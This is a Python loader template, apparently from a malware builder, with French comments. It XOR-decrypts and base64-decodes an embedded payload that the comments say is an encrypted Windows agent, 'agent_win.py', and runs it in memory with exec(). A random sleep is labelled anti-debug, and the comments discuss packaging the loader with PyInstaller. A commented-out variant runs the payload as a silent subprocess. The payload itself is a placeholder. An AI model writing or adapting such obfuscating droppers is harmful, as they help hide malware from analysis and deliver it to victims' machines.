# build/template_wrapper.py

import base64
import tempfile
import subprocess
import os
import sys
import time
import random
import traceback  # Pour affichage complet des erreurs

# 🎯 Import forcé pour PyInstaller (important pour ne pas casser l'exécution du payload)
try:
    import ctypes
    import _ctypes
except ImportError:
    pass

# XOR_KEY sera remplacé dynamiquement à l’injection
XOR_KEY = 13
encrypted = <ENCRYPTED_B64_PAYLOAD>  # Remplacé dynamiquement par base64(xor(agent_win.py))

def xor_decrypt(data, key):
    try:
        decoded_bytes = base64.b64decode(data)
        decrypted_bytes = bytes([b ^ key for b in decoded_bytes])
        return decrypted_bytes.decode("utf-8")
    except Exception as e:
        print(f"[❌] Erreur de déchiffrement : {e}")
        return ""

def execute_payload(decoded_code):
    try:
        print("[*] Déchiffrement réussi. Extrait du code :")
        print(decoded_code[:300])

        # ✅ Contexte propre pour éviter les ModuleNotFoundError
        context = {
            "__name__": "__main__",
            "__file__": "__payload__"
        }
        exec(decoded_code, context)

        # ✅ Alternative avec fichier temporaire :
        # with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".py") as f:
        #     f.write(decoded_code)
        #     temp_path = f.name
        # subprocess.Popen([sys.executable, temp_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    except Exception:
        print(f"[❌] Erreur lors de l'exécution du payload :")
        traceback.print_exc()
        print("\n[💡] Extrait du code déchiffré pour debug :\n")
        print(decoded_code[:500])

if __name__ == "__main__":
    print("[*] Démarrage du wrapper (anti-debug + délai aléatoire)...")
    time.sleep(random.randint(2, 7))

    print("[*] Déchiffrement du payload...")
    decrypted_payload = xor_decrypt(encrypted, XOR_KEY)

    if decrypted_payload:
        execute_payload(decrypted_payload)
    else:
        print("[!] Aucun code à exécuter. Déchiffrement échoué.")
